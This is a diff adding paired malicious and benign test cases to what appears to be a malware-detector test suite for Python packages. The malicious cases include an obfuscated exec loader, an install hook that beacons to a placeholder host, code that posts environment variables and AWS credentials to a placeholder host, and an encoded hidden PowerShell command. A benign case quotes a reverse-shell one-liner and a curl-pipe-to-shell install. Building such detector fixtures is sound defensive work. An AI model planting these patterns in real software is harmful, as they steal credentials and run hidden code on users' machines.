@@ -1157,6 +1157,95 @@ CASES: list[Case] = [
         "from pathlib import Path\ndef build(path: Path = Path('.')):\n"
         "    with open(path / 'pyproject.toml') as f:\n        return f.read()\n",
     ),
+    # --- malware: how malicious packages are built, each with a benign twin ---
+    # Every URL is on the reserved .invalid domain; payloads decode to "pass".
+    Case(
+        "malware-obfuscated-exec-import",
+        "malware",
+        "pkg/__init__.py",
+        True,
+        "import base64, builtins, zlib\n"
+        "_k = ''.join(map(chr, (101, 120, 101, 99)))\n"
+        "getattr(builtins, _k)(zlib.decompress(base64.b85decode("
+        "b'c$_OpEG|}1P*%uDEXvJE1+vpJD@sa>QUPZQ2*C')))\n",
+    ),
+    Case(
+        "malware-encoded-data-safe",
+        "malware",
+        "pkg/__init__.py",
+        False,
+        "import base64\nICON = base64.b64decode('cGFzcw==')\n",
+    ),
+    Case(
+        "malware-install-hook-beacon",
+        "malware",
+        "setup.py",
+        True,
+        "import getpass, socket, urllib.request\n"
+        "from setuptools import setup\n"
+        "from setuptools.command.install import install\n"
+        "class Hook(install):\n"
+        "    def run(self):\n"
+        "        who = f'{socket.gethostname()}|{getpass.getuser()}'.encode()\n"
+        "        urllib.request.urlopen('https://collect.invalid/c', data=who)\n"
+        "        install.run(self)\n"
+        "setup(name='fixturepkg', cmdclass={'install': Hook})\n",
+    ),
+    Case(
+        "malware-plain-setup-safe",
+        "malware",
+        "setup.py",
+        False,
+        "from setuptools import setup\n"
+        "with open('README.md') as f:\n    long_description = f.read()\n"
+        "setup(name='fixturepkg', version='1.0', long_description=long_description)\n",
+    ),
+    Case(
+        "malware-credential-exfil",
+        "malware",
+        "pkg/sync.py",
+        True,
+        "import os, requests\n"
+        "def sync():\n"
+        "    blob = {'env': dict(os.environ)}\n"
+        "    with open(os.path.expanduser('~/.aws/credentials')) as fh:\n"
+        "        blob['aws'] = fh.read()\n"
+        "    requests.post('https://drop.invalid/u', json=blob, timeout=5)\n",
+    ),
+    Case(
+        "malware-authenticated-api-call-safe",
+        "malware",
+        "pkg/client.py",
+        False,
+        "import os, requests\n"
+        "def publish(payload):\n"
+        "    token = os.environ['SERVICE_TOKEN']\n"
+        "    return requests.post('https://api.invalid/v1/items', json=payload,\n"
+        "                         headers={'Authorization': f'Bearer {token}'}, timeout=5)\n",
+    ),
+    Case(
+        "malware-installer-doc-safe",
+        "malware",
+        "README.md",
+        False,
+        "Install uv first: `curl -LsSf https://astral.sh/uv/install.sh | sh`\n\n"
+        "Detects shells such as `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`.\n",
+    ),
+    Case(
+        "malware-powershell-encoded",
+        "malware",
+        "run.ps1",
+        True,
+        "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\n",
+    ),
+    Case(
+        "malware-pip-editable-safe",
+        "malware",
+        "build.sh",
+        False,
+        "#!/bin/sh\npip install -e /absolute/path/to/the/project/checkout\n"
+        "docker run -d -e POSTGRES_PASSWORD_FILE=/run/secrets/pg -e PGDATA=/var/lib/pg/data db\n",
+    ),
 ]
 
 
